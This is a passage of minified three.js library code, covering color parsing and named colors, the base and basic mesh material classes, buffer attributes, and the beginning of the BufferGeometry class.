o=l/(l-u),t.copy(n).addScaledVector(On,o);Pr.subVectors(e,s);const m=On.dot(Pr),E=Un.dot(Pr);if(E>=0&&m<=E)return t.copy(s);const x=m*d-l*E;if(x<=0&&d>=0&&E<=0)return a=d/(d-E),t.copy(n).addScaledVector(Un,a);const f=u*E-m*h;if(f<=0&&h-u>=0&&m-E>=0)return pa.subVectors(s,r),a=(h-u)/(h-u+(m-E)),t.copy(r).addScaledVector(pa,a);const c=1/(f+x+p);return o=x*c,a=p*c,t.copy(n).addScaledVector(On,o).addScaledVector(Un,a)}equals(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)}}const go={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},nn={h:0,s:0,l:0},Pi={h:0,s:0,l:0};function Ir(i,e,t){return t<0&&(t+=1),t>1&&(t-=1),t<1/6?i+(e-i)*6*t:t<1/2?e:t<2/3?i+(e-i)*6*(2/3-t):i}class He{constructor(e,t,n){return this.isColor=!0,this.r=1,this.g=1,this.b=1,this.set(e,t,n)}set(e,t,n){if(t===void 0&&n===void 0){const r=e;r&&r.isColor?this.copy(r):typeof r=="number"?this.setHex(r):typeof r=="string"&&this.setStyle(r)}else this.setRGB(e,t,n);return this}setScalar(e){return this.r=e,this.g=e,this.b=e,this}setHex(e,t=lt){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(e&255)/255,We.toWorkingColorSpace(this,t),this}setRGB(e,t,n,r=We.workingColorSpace){return this.r=e,this.g=t,this.b=n,We.toWorkingColorSpace(this,r),this}setHSL(e,t,n,r=We.workingColorSpace){if(e=Gl(e,1),t=xt(t,0,1),n=xt(n,0,1),t===0)this.r=this.g=this.b=n;else{const s=n<=.5?n*(1+t):n+t-n*t,o=2*n-s;this.r=Ir(o,s,e+1/3),this.g=Ir(o,s,e),this.b=Ir(o,s,e-1/3)}return We.toWorkingColorSpace(this,r),this}setStyle(e,t=lt){function n(s){s!==void 0&&parseFloat(s)<1&&console.warn("THREE.Color: Alpha component of "+e+" will be ignored.")}let r;if(r=/^(\w+)\(([^\)]*)\)/.exec(e)){let s;const o=r[1],a=r[2];switch(o){case"rgb":case"rgba":if(s=/^\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return n(s[4]),this.setRGB(Math.min(255,parseInt(s[1],10))/255,Math.min(255,parseInt(s[2],10))/255,Math.min(255,parseInt(s[3],10))/255,t);if(s=/^\s*(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return n(s[4]),this.setRGB(Math.min(100,parseInt(s[1],10))/100,Math.min(100,parseInt(s[2],10))/100,Math.min(100,parseInt(s[3],10))/100,t);break;case"hsl":case"hsla":if(s=/^\s*(\d*\.?\d+)\s*,\s*(\d*\.?\d+)\%\s*,\s*(\d*\.?\d+)\%\s*(?:,\s*(\d*\.?\d+)\s*)?$/.exec(a))return n(s[4]),this.setHSL(parseFloat(s[1])/360,parseFloat(s[2])/100,parseFloat(s[3])/100,t);break;default:console.warn("THREE.Color: Unknown color model "+e)}}else if(r=/^\#([A-Fa-f\d]+)$/.exec(e)){const s=r[1],o=s.length;if(o===3)return this.setRGB(parseInt(s.charAt(0),16)/15,parseInt(s.charAt(1),16)/15,parseInt(s.charAt(2),16)/15,t);if(o===6)return this.setHex(parseInt(s,16),t);console.warn("THREE.Color: Invalid hex color "+e)}else if(e&&e.length>0)return this.setColorName(e,t);return this}setColorName(e,t=lt){const n=go[e.toLowerCase()];return n!==void 0?this.setHex(n,t):console.warn("THREE.Color: Unknown color "+e),this}clone(){return new this.constructor(this.r,this.g,this.b)}copy(e){return this.r=e.r,this.g=e.g,this.b=e.b,this}copySRGBToLinear(e){return this.r=jn(e.r),this.g=jn(e.g),this.b=jn(e.b),this}copyLinearToSRGB(e){return this.r=xr(e.r),this.g=xr(e.g),this.b=xr(e.b),this}convertSRGBToLinear(){return this.copySRGBToLinear(this),this}convertLinearToSRGB(){return this.copyLinearToSRGB(this),this}getHex(e=lt){return We.fromWorkingColorSpace(ft.copy(this),e),Math.round(xt(ft.r*255,0,255))*65536+Math.round(xt(ft.g*255,0,255))*256+Math.round(xt(ft.b*255,0,255))}getHexString(e=lt){return("000000"+this.getHex(e).toString(16)).slice(-6)}getHSL(e,t=We.workingColorSpace){We.fromWorkingColorSpace(ft.copy(this),t);const n=ft.r,r=ft.g,s=ft.b,o=Math.max(n,r,s),a=Math.min(n,r,s);let l,d;const u=(a+o)/2;if(a===o)l=0,d=0;else{const h=o-a;switch(d=u<=.5?h/(o+a):h/(2-o-a),o){case n:l=(r-s)/h+(r<s?6:0);break;case r:l=(s-n)/h+2;break;case s:l=(n-r)/h+4;break}l/=6}return e.h=l,e.s=d,e.l=u,e}getRGB(e,t=We.workingColorSpace){return We.fromWorkingColorSpace(ft.copy(this),t),e.r=ft.r,e.g=ft.g,e.b=ft.b,e}getStyle(e=lt){We.fromWorkingColorSpace(ft.copy(this),e);const t=ft.r,n=ft.g,r=ft.b;return e!==lt?`color(${e} ${t.toFixed(3)} ${n.toFixed(3)} ${r.toFixed(3)})`:`rgb(${Math.round(t*255)},${Math.round(n*255)},${Math.round(r*255)})`}offsetHSL(e,t,n){return this.getHSL(nn),this.setHSL(nn.h+e,nn.s+t,nn.l+n)}add(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this}addColors(e,t){return this.r=e.r+t.r,this.g=e.g+t.g,this.b=e.b+t.b,this}addScalar(e){return this.r+=e,this.g+=e,this.b+=e,this}sub(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this}multiply(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this}multiplyScalar(e){return this.r*=e,this.g*=e,this.b*=e,this}lerp(e,t){return this.r+=(e.r-this.r)*t,this.g+=(e.g-this.g)*t,this.b+=(e.b-this.b)*t,this}lerpColors(e,t,n){return this.r=e.r+(t.r-e.r)*n,this.g=e.g+(t.g-e.g)*n,this.b=e.b+(t.b-e.b)*n,this}lerpHSL(e,t){this.getHSL(nn),e.getHSL(Pi);const n=gr(nn.h,Pi.h,t),r=gr(nn.s,Pi.s,t),s=gr(nn.l,Pi.l,t);return this.setHSL(n,r,s),this}setFromVector3(e){return this.r=e.x,this.g=e.y,this.b=e.z,this}applyMatrix3(e){const t=this.r,n=this.g,r=this.b,s=e.elements;return this.r=s[0]*t+s[3]*n+s[6]*r,this.g=s[1]*t+s[4]*n+s[7]*r,this.b=s[2]*t+s[5]*n+s[8]*r,this}equals(e){return e.r===this.r&&e.g===this.g&&e.b===this.b}fromArray(e,t=0){return this.r=e[t],this.g=e[t+1],this.b=e[t+2],this}toArray(e=[],t=0){return e[t]=this.r,e[t+1]=this.g,e[t+2]=this.b,e}fromBufferAttribute(e,t){return this.r=e.getX(t),this.g=e.getY(t),this.b=e.getZ(t),this}toJSON(){return this.getHex()}*[Symbol.iterator](){yield this.r,yield this.g,yield this.b}}const ft=new He;He.NAMES=go;let nc=0;class gi extends Jn{constructor(){super(),this.isMaterial=!0,Object.defineProperty(this,"id",{value:nc++}),this.uuid=mi(),this.name="",this.type="Material",this.blending=Yn,this.side=cn,this.vertexColors=!1,this.opacity=1,this.transparent=!1,this.alphaHash=!1,this.blendSrc=Yr,this.blendDst=jr,this.blendEquation=vn,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.blendColor=new He(0,0,0),this.blendAlpha=0,this.depthFunc=Yi,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=Qs,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=wn,this.stencilZFail=wn,this.stencilZPass=wn,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaToCoverage=!1,this.premultipliedAlpha=!1,this.forceSinglePass=!1,this.visible=!0,this.toneMapped=!0,this.userData={},this.version=0,this._alphaTest=0}get alphaTest(){return this._alphaTest}set alphaTest(e){this._alphaTest>0!=e>0&&this.version++,this._alphaTest=e}onBuild(){}onBeforeRender(){}onBeforeCompile(){}customProgramCacheKey(){return this.onBeforeCompile.toString()}setValues(e){if(e!==void 0)for(const t in e){const n=e[t];if(n===void 0){console.warn(`THREE.Material: parameter '${t}' has value of undefined.`);continue}const r=this[t];if(r===void 0){console.warn(`THREE.Material: '${t}' is not a property of THREE.${this.type}.`);continue}r&&r.isColor?r.set(n):r&&r.isVector3&&n&&n.isVector3?r.copy(n):this[t]=n}}toJSON(e){const t=e===void 0||typeof e=="string";t&&(e={textures:{},images:{}});const n={metadata:{version:4.6,type:"Material",generator:"Material.toJSON"}};n.uuid=this.uuid,n.type=this.type,this.name!==""&&(n.name=this.name),this.color&&this.color.isColor&&(n.color=this.color.getHex()),this.roughness!==void 0&&(n.roughness=this.roughness),this.metalness!==void 0&&(n.metalness=this.metalness),this.sheen!==void 0&&(n.sheen=this.sheen),this.sheenColor&&this.sheenColor.isColor&&(n.sheenColor=this.sheenColor.getHex()),this.sheenRoughness!==void 0&&(n.sheenRoughness=this.sheenRoughness),this.emissive&&this.emissive.isColor&&(n.emissive=this.emissive.getHex()),this.emissiveIntensity&&this.emissiveIntensity!==1&&(n.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(n.specular=this.specular.getHex()),this.specularIntensity!==void 0&&(n.specularIntensity=this.specularIntensity),this.specularColor&&this.specularColor.isColor&&(n.specularColor=this.specularColor.getHex()),this.shininess!==void 0&&(n.shininess=this.shininess),this.clearcoat!==void 0&&(n.clearcoat=this.clearcoat),this.clearcoatRoughness!==void 0&&(n.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(n.clearcoatMap=this.clearcoatMap.toJSON(e).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(n.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(e).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(n.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,n.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.iridescence!==void 0&&(n.iridescence=this.iridescence),this.iridescenceIOR!==void 0&&(n.iridescenceIOR=this.iridescenceIOR),this.iridescenceThicknessRange!==void 0&&(n.iridescenceThicknessRange=this.iridescenceThicknessRange),this.iridescenceMap&&this.iridescenceMap.isTexture&&(n.iridescenceMap=this.iridescenceMap.toJSON(e).uuid),this.iridescenceThicknessMap&&this.iridescenceThicknessMap.isTexture&&(n.iridescenceThicknessMap=this.iridescenceThicknessMap.toJSON(e).uuid),this.anisotropy!==void 0&&(n.anisotropy=this.anisotropy),this.anisotropyRotation!==void 0&&(n.anisotropyRotation=this.anisotropyRotation),this.anisotropyMap&&this.anisotropyMap.isTexture&&(n.anisotropyMap=this.anisotropyMap.toJSON(e).uuid),this.map&&this.map.isTexture&&(n.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(n.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(n.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(n.lightMap=this.lightMap.toJSON(e).uuid,n.lightMapIntensity=this.lightMapIntensity),this.aoMap&&this.aoMap.isTexture&&(n.aoMap=this.aoMap.toJSON(e).uuid,n.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(n.bumpMap=this.bumpMap.toJSON(e).uuid,n.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(n.normalMap=this.normalMap.toJSON(e).uuid,n.normalMapType=this.normalMapType,n.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(n.displacementMap=this.displacementMap.toJSON(e).uuid,n.displacementScale=this.displacementScale,n.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(n.roughnessMap=this.roughnessMap.toJSON(e).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(n.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(n.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(n.specularMap=this.specularMap.toJSON(e).uuid),this.specularIntensityMap&&this.specularIntensityMap.isTexture&&(n.specularIntensityMap=this.specularIntensityMap.toJSON(e).uuid),this.specularColorMap&&this.specularColorMap.isTexture&&(n.specularColorMap=this.specularColorMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(n.envMap=this.envMap.toJSON(e).uuid,this.combine!==void 0&&(n.combine=this.combine)),this.envMapIntensity!==void 0&&(n.envMapIntensity=this.envMapIntensity),this.reflectivity!==void 0&&(n.reflectivity=this.reflectivity),this.refractionRatio!==void 0&&(n.refractionRatio=this.refractionRatio),this.gradientMap&&this.gradientMap.isTexture&&(n.gradientMap=this.gradientMap.toJSON(e).uuid),this.transmission!==void 0&&(n.transmission=this.transmission),this.transmissionMap&&this.transmissionMap.isTexture&&(n.transmissionMap=this.transmissionMap.toJSON(e).uuid),this.thickness!==void 0&&(n.thickness=this.thickness),this.thicknessMap&&this.thicknessMap.isTexture&&(n.thicknessMap=this.thicknessMap.toJSON(e).uuid),this.attenuationDistance!==void 0&&this.attenuationDistance!==1/0&&(n.attenuationDistance=this.attenuationDistance),this.attenuationColor!==void 0&&(n.attenuationColor=this.attenuationColor.getHex()),this.size!==void 0&&(n.size=this.size),this.shadowSide!==null&&(n.shadowSide=this.shadowSide),this.sizeAttenuation!==void 0&&(n.sizeAttenuation=this.sizeAttenuation),this.blending!==Yn&&(n.blending=this.blending),this.side!==cn&&(n.side=this.side),this.vertexColors===!0&&(n.vertexColors=!0),this.opacity<1&&(n.opacity=this.opacity),this.transparent===!0&&(n.transparent=!0),this.blendSrc!==Yr&&(n.blendSrc=this.blendSrc),this.blendDst!==jr&&(n.blendDst=this.blendDst),this.blendEquation!==vn&&(n.blendEquation=this.blendEquation),this.blendSrcAlpha!==null&&(n.blendSrcAlpha=this.blendSrcAlpha),this.blendDstAlpha!==null&&(n.blendDstAlpha=this.blendDstAlpha),this.blendEquationAlpha!==null&&(n.blendEquationAlpha=this.blendEquationAlpha),this.blendColor&&this.blendColor.isColor&&(n.blendColor=this.blendColor.getHex()),this.blendAlpha!==0&&(n.blendAlpha=this.blendAlpha),this.depthFunc!==Yi&&(n.depthFunc=this.depthFunc),this.depthTest===!1&&(n.depthTest=this.depthTest),this.depthWrite===!1&&(n.depthWrite=this.depthWrite),this.colorWrite===!1&&(n.colorWrite=this.colorWrite),this.stencilWriteMask!==255&&(n.stencilWriteMask=this.stencilWriteMask),this.stencilFunc!==Qs&&(n.stencilFunc=this.stencilFunc),this.stencilRef!==0&&(n.stencilRef=this.stencilRef),this.stencilFuncMask!==255&&(n.stencilFuncMask=this.stencilFuncMask),this.stencilFail!==wn&&(n.stencilFail=this.stencilFail),this.stencilZFail!==wn&&(n.stencilZFail=this.stencilZFail),this.stencilZPass!==wn&&(n.stencilZPass=this.stencilZPass),this.stencilWrite===!0&&(n.stencilWrite=this.stencilWrite),this.rotation!==void 0&&this.rotation!==0&&(n.rotation=this.rotation),this.polygonOffset===!0&&(n.polygonOffset=!0),this.polygonOffsetFactor!==0&&(n.polygonOffsetFactor=this.polygonOffsetFactor),this.polygonOffsetUnits!==0&&(n.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth!==void 0&&this.linewidth!==1&&(n.linewidth=this.linewidth),this.dashSize!==void 0&&(n.dashSize=this.dashSize),this.gapSize!==void 0&&(n.gapSize=this.gapSize),this.scale!==void 0&&(n.scale=this.scale),this.dithering===!0&&(n.dithering=!0),this.alphaTest>0&&(n.alphaTest=this.alphaTest),this.alphaHash===!0&&(n.alphaHash=!0),this.alphaToCoverage===!0&&(n.alphaToCoverage=!0),this.premultipliedAlpha===!0&&(n.premultipliedAlpha=!0),this.forceSinglePass===!0&&(n.forceSinglePass=!0),this.wireframe===!0&&(n.wireframe=!0),this.wireframeLinewidth>1&&(n.wireframeLinewidth=this.wireframeLinewidth),this.wireframeLinecap!=="round"&&(n.wireframeLinecap=this.wireframeLinecap),this.wireframeLinejoin!=="round"&&(n.wireframeLinejoin=this.wireframeLinejoin),this.flatShading===!0&&(n.flatShading=!0),this.visible===!1&&(n.visible=!1),this.toneMapped===!1&&(n.toneMapped=!1),this.fog===!1&&(n.fog=!1),Object.keys(this.userData).length>0&&(n.userData=this.userData);function r(s){const o=[];for(const a in s){const l=s[a];delete l.metadata,o.push(l)}return o}if(t){const s=r(e.textures),o=r(e.images);s.length>0&&(n.textures=s),o.length>0&&(n.images=o)}return n}clone(){return new this.constructor().copy(this)}copy(e){this.name=e.name,this.blending=e.blending,this.side=e.side,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.blendColor.copy(e.blendColor),this.blendAlpha=e.blendAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.stencilWrite=e.stencilWrite;const t=e.clippingPlanes;let n=null;if(t!==null){const r=t.length;n=new Array(r);for(let s=0;s!==r;++s)n[s]=t[s].clone()}return this.clippingPlanes=n,this.clipIntersection=e.clipIntersection,this.clipShadows=e.clipShadows,this.shadowSide=e.shadowSide,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.alphaHash=e.alphaHash,this.alphaToCoverage=e.alphaToCoverage,this.premultipliedAlpha=e.premultipliedAlpha,this.forceSinglePass=e.forceSinglePass,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this}dispose(){this.dispatchEvent({type:"dispose"})}set needsUpdate(e){e===!0&&this.version++}}class pi extends gi{constructor(e){super(),this.isMeshBasicMaterial=!0,this.type="MeshBasicMaterial",this.color=new He(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=to,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.fog=e.fog,this}}const tt=new L,Ii=new Be;class zt{constructor(e,t,n=!1){if(Array.isArray(e))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.isBufferAttribute=!0,this.name="",this.array=e,this.itemSize=t,this.count=e!==void 0?e.length/t:0,this.normalized=n,this.usage=Js,this._updateRange={offset:0,count:-1},this.updateRanges=[],this.gpuType=sn,this.version=0}onUploadCallback(){}set needsUpdate(e){e===!0&&this.version++}get updateRange(){return console.warn("THREE.BufferAttribute: updateRange() is deprecated and will be removed in r169. Use addUpdateRange() instead."),this._updateRange}setUsage(e){return this.usage=e,this}addUpdateRange(e,t){this.updateRanges.push({start:e,count:t})}clearUpdateRanges(){this.updateRanges.length=0}copy(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this.gpuType=e.gpuType,this}copyAt(e,t,n){e*=this.itemSize,n*=t.itemSize;for(let r=0,s=this.itemSize;r<s;r++)this.array[e+r]=t.array[n+r];return this}copyArray(e){return this.array.set(e),this}applyMatrix3(e){if(this.itemSize===2)for(let t=0,n=this.count;t<n;t++)Ii.fromBufferAttribute(this,t),Ii.applyMatrix3(e),this.setXY(t,Ii.x,Ii.y);else if(this.itemSize===3)for(let t=0,n=this.count;t<n;t++)tt.fromBufferAttribute(this,t),tt.applyMatrix3(e),this.setXYZ(t,tt.x,tt.y,tt.z);return this}applyMatrix4(e){for(let t=0,n=this.count;t<n;t++)tt.fromBufferAttribute(this,t),tt.applyMatrix4(e),this.setXYZ(t,tt.x,tt.y,tt.z);return this}applyNormalMatrix(e){for(let t=0,n=this.count;t<n;t++)tt.fromBufferAttribute(this,t),tt.applyNormalMatrix(e),this.setXYZ(t,tt.x,tt.y,tt.z);return this}transformDirection(e){for(let t=0,n=this.count;t<n;t++)tt.fromBufferAttribute(this,t),tt.transformDirection(e),this.setXYZ(t,tt.x,tt.y,tt.z);return this}set(e,t=0){return this.array.set(e,t),this}getComponent(e,t){let n=this.array[e*this.itemSize+t];return this.normalized&&(n=ii(n,this.array)),n}setComponent(e,t,n){return this.normalized&&(n=vt(n,this.array)),this.array[e*this.itemSize+t]=n,this}getX(e){let t=this.array[e*this.itemSize];return this.normalized&&(t=ii(t,this.array)),t}setX(e,t){return this.normalized&&(t=vt(t,this.array)),this.array[e*this.itemSize]=t,this}getY(e){let t=this.array[e*this.itemSize+1];return this.normalized&&(t=ii(t,this.array)),t}setY(e,t){return this.normalized&&(t=vt(t,this.array)),this.array[e*this.itemSize+1]=t,this}getZ(e){let t=this.array[e*this.itemSize+2];return this.normalized&&(t=ii(t,this.array)),t}setZ(e,t){return this.normalized&&(t=vt(t,this.array)),this.array[e*this.itemSize+2]=t,this}getW(e){let t=this.array[e*this.itemSize+3];return this.normalized&&(t=ii(t,this.array)),t}setW(e,t){return this.normalized&&(t=vt(t,this.array)),this.array[e*this.itemSize+3]=t,this}setXY(e,t,n){return e*=this.itemSize,this.normalized&&(t=vt(t,this.array),n=vt(n,this.array)),this.array[e+0]=t,this.array[e+1]=n,this}setXYZ(e,t,n,r){return e*=this.itemSize,this.normalized&&(t=vt(t,this.array),n=vt(n,this.array),r=vt(r,this.array)),this.array[e+0]=t,this.array[e+1]=n,this.array[e+2]=r,this}setXYZW(e,t,n,r,s){return e*=this.itemSize,this.normalized&&(t=vt(t,this.array),n=vt(n,this.array),r=vt(r,this.array),s=vt(s,this.array)),this.array[e+0]=t,this.array[e+1]=n,this.array[e+2]=r,this.array[e+3]=s,this}onUpload(e){return this.onUploadCallback=e,this}clone(){return new this.constructor(this.array,this.itemSize).copy(this)}toJSON(){const e={itemSize:this.itemSize,type:this.array.constructor.name,array:Array.from(this.array),normalized:this.normalized};return this.name!==""&&(e.name=this.name),this.usage!==Js&&(e.usage=this.usage),e}}class vo extends zt{constructor(e,t,n){super(new Uint16Array(e),t,n)}}class xo extends zt{constructor(e,t,n){super(new Uint32Array(e),t,n)}}class dt extends zt{constructor(e,t,n){super(new Float32Array(e),t,n)}}let ic=0;const Rt=new Ze,Lr=new yt,Fn=new L,bt=new Rn,oi=new Rn,ot=new L;class It extends Jn{constructor(){super(),this.isBufferGeometry=!0,Object.defineProperty(this,"id",{value:ic++}),this.uuid=mi(),this.name="",this.type="BufferGeometry",this.index=null,this.attributes={},this.morphAttributes={},this.morphTargetsRelative=!1,this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.drawRange={start:0,count:1/0},this.userData={}}getIndex(){return this.index}setIndex(e){return Array.isArray(e)?this.index=new(fo(e)?xo:vo)(e,1):this.index=e,this}getAttribute(e){return this.attributes[e]}setAttribute(e,t){return this.attributes[e]=t,this}deleteAttribute(e){return delete this.attributes[e],this}hasAttribute(e){return this.attributes[e]!==void 0}addGroup(e,t,n=0){this.groups.push({start:e,count:t,materialIndex:n})}clearGroups(){this.groups=[]}setDrawRange(e,t){this.drawRange.start=e,this.drawRange.count=t}applyMatrix4(e){const t=this.attributes.position;t!==void 0&&(t.applyMatrix4(e),t.needsUpdate=!0);const n=this.attributes.normal;if(n!==void 0){const s=new ke().getNormalMatrix(e);n.applyNormalMatrix(s),n.needsUpdate=!0}const r=this.attributes.tangent;return r!==void 0&&(r.transformDirection(e),r.needsUpdate=!0),this.boundingBox!==null&&this.computeBoundingBox(),this.boundingSphere!==null&&this.computeBoundingSphere(),this}applyQuaternion(e){return Rt.makeRotationFromQuaternion(e),this.applyMatrix4(Rt),this}rotateX(e){return Rt.makeRotationX(e),this.applyMatrix4(Rt),this}rotateY(e){return Rt.makeRotationY(e),this.applyMatrix4(Rt),this}rotateZ(e){return Rt.makeRotationZ(e),this.applyMatrix4(Rt),this}translate(e,t,n){return Rt.makeTranslation(e,t,n),this.applyMatrix4(Rt),this}scale(e,t,n){return Rt.makeScale(e,t,n),this.applyMatrix4(Rt),this}lookAt(e){return Lr.lookAt(e),Lr.updateMatrix(),this.applyMatrix4(Lr.matrix),this}center(){return this.computeBoundingBox(),this.boundingBox.getCenter(Fn).negate(),this.translate(Fn.x,Fn.y,Fn.z),this}setFromPoints(e){const t=[];for(let n=0,r=e.length;n<r;n++){const s=e[n];t.push(s.x,s.y,s.z||0)}return this.setAttribute("position",new dt(t,3)),this}computeBoundingBox(){this.boundingBox===null&&(this.boundingBox=new Rn);const e=this.attributes.position,t=this.morphAttributes.position;if(e&&e.isGLBufferAttribute){console.error('THREE.BufferGeometry.computeBoundingBox(): GLBufferAttribute requires a manual bounding box. Alternatively set "mesh.frustumCulled" to "false".',this),this.boundingBox.set(new L(-1/0,-1/0,-1/0),new L(1/0,1/0,1/0));return}if(e!==void 0){if(this.boundingBox.setFromBufferAttribute(e),t)for(let n=0,r=t.length;n<r;n++){const s=t[n];bt.setFromBufferAttribute(s),this.morphTargetsRelative?(ot.addVectors(this.boundingBox.min,bt.min),this.boundingBox.expandByPoint(ot),ot.addVectors(this.boundingBox.max,bt.max),this.boundingBox.expandByPoint(ot)):(this.boundingBox.expandByPoint(bt.min),this.boundingBox.expandByPoint(bt.max))}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&console.error('THREE.BufferGeometry.computeBoundingBox(): Computed min/max have NaN values. The "position" attribute is likely to 